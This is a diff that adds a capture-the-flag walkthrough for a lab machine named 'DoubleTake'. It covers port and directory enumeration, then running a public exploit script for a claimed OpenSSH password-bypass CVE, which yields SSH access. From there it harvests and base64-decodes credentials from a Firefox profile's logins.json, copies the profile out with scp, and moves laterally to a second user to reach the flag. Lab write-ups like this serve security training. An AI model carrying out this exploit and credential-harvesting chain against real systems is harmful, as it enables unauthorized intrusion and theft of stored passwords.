@@ -1,0 +1,200 @@
+-----------
+DoubleTake
+-----------
+
+sudo nmap 10.129.248.123 -n -Pn -sCVS --min-rate 5000
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-23 14:55 EST
+Nmap scan report for 10.129.248.123
+Host is up (0.012s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-auth:
+| HTTP/1.1 401 UNAUTHORIZED\x0D
+|_  Basic realm=Zentara
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
+-----------------------------------------------------------------------------------------------------------------------
+
+gobuster dir -u http://doubletake.htb -w /usr/share/wordlists/dirb/big.txt -x php,html,zip,txt,md -t 20
+...
+/agents               (Status: 401) [Size: 0]
+/deploy               (Status: 401) [Size: 0]
+/docs                 (Status: 401) [Size: 0]
+/files                (Status: 401) [Size: 0]
+/settings             (Status: 401) [Size: 0]
+/status               (Status: 401) [Size: 0]
+/usage                (Status: 401) [Size: 0]
+...
+---
+
+curl -I http://doubletake.htb
+
+HTTP/1.1 401 UNAUTHORIZED
+Server: nginx/1.24.0 (Ubuntu)
+Date: Mon, 23 Nov 2026 20:15:46 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+WWW-Authenticate: Basic realm="Zentara"
+---
+
+git clone https://github.com/gabrielunknown/CVE-2026-123158_SSHole.git
+Cloning into 'CVE-2026-123158_SSHole'...
+remote: Enumerating objects: 13, done.
+remote: Counting objects: 100% (13/13), done.
+remote: Compressing objects: 100% (13/13), done.
+remote: Total 13 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (13/13), 24.89 KiB | 24.89 MiB/s, done.
+Resolving deltas: 100% (3/3), done.
+---
+
+cd CVE-2026-123158_SSHole
+---
+
+python exploit.py --single 10.129.248.123 --port 22 --user alpine --auto
+
+CVE-2026-123158 -- SSHole
+OpenSSH Password Bypass | musl libc | Alpine Linux
+CVSS 3.1: 8.1 (High)   Disclosure: 2026-11-05
+
+[*] Auto-scan -- 10.129.248.123:22
+[*] Accounts : root, alpine, ec2-user, nobody, nginx, postgres
+[*] Password : 300 bytes  (2 attempts/connection, 6s delay between accounts)
+
+...
+  alpine       [+] VULNERABLE  ->  uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
+...
+
+Generate password == 300 byte
+
+openssl rand -hex 150 | tr -d '\n'
+
+81215ffd983d5b776cd87a020691918415b407a24141bce254568e1ef293f738390f283a587f920775d6bd6ace3fbe3c6d92e11a61155f08924561eff71dedfe2d03f772f6989ff2e8d9ff8a753cbafeeaad53a80ee31ebf8ef976468022294e8606252ad0e28ab224c07228b7d21546fc4c94952e1370f77c8a1ac075d2832c68a9a6bfb7fee1fe4c3a10f6d8e7c21a6e105596a21a
+---
+
+ssh alpine@doubletake.htb
+
+alpine@doubletake.htb's password:
+
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+---
+
+7f906e0ee8ec:~$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/sh
+...
+alpine:x:1000:1000::/home/alpine:/bin/sh
+bob:x:1001:1001::/home/bob:/bin/sh
+---
+
+~/.mozilla/firefox$ cat profiles.ini
+[Profile0]
+Name=default
+IsRelative=1
+Path=zentara.default
+Default=1
+
+[General]
+StartWithLastProfile=1
+---
+
+7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ ls
+
+cert9.db           key4.db            logins.json        pkcs11.txt         prefs.js           signedInUser.json
+---
+
+7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ cat logins.json
+
+{
+    "nextId":2,
+    "logins":[
+        {
+            "id":1,
+            "hostname":"http://172.17.0.1",
+            "httpRealm":"Zentara",
+            "formActionOrigin":null,
+            "usernameField":"",
+            "passwordField":"",
+            "encryptedUsername":"Ym9i",
+            "encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
+            "guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}",
+            "encType":0,
+            "timeCreated":1730000000000,
+            "timeLastUsed":1730900000000,
+            "timePasswordChanged":1730000000000,
+            "timesUsed":14
+        }
+    ],
+    "potentiallyVulnerablePasswords":[],
+    "dismissedBreachAlertsByLoginGUID":{},
+    "version":3
+}
+---
+
+cat pkcs11.txt
+
+library=name=NSS Internal PKCS #11 Moduleparameters=configdir='sql:/home/alpine/.mozilla/firefox/zentara.default' certPrefix=''
+keyPrefix='' secmod='secmod.db' flags= updatedir='' updateCertPrefix='' updateKeyPrefix='' updateid='' updateTokenDescription=''
+NSS=Flags=internal,critical trustOrder=75 cipherOrder=100
+slotParams=(1={slotFlags=[ECC,RSA,DSA,DH,RC2,RC4,DES,RANDOM,SHA1,MD5,MD2,SSL,TLS,AES,Camellia,SEED,SHA256,SHA512] askpw=any timeout=30})
+---
+
+cat prefs.js
+
+user_pref("signon.rememberSignons", true);
+user_pref("signon.autofillForms", true);
+user_pref("browser.startup.homepage", "http://172.17.0.1");
+user_pref("browser.startup.page", 1);
+---
+
+
+
+
+echo Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ== | base64 -d
+
+CorrectHorseBatteryStaple
+---
+
+echo Ym9i | base64 -d
+
+bob
+----
+
+username: bob
+password: CorrectHorseBatteryStaple
+---
+
+scp -r alpine@doubletake.htb:/home/alpine/.mozilla/firefox/zentara.default .
+alpine@doubletake.htb's password:
+
+signedInUser.json           100%    2     0.1KB/s   00:00
+pkcs11.txt                  100%  456    26.8KB/s   00:00
+logins.json                 100%  487    28.6KB/s   00:00
+cert9.db                    100%   28KB 960.5KB/s   00:00
+prefs.js                    100%  182    10.7KB/s   00:00
+key4.db                     100%   36KB   1.7MB/s   00:00
+---
+
+ssh bob@doubletake.htb
+bob@doubletake.htb's password:
+...
+---
+
+7f906e0ee8ec:~$ cat user.txt
+
+bf3aa080f1d1edc72396e0101f43510a
+-----------------------------------------------------------------------------------
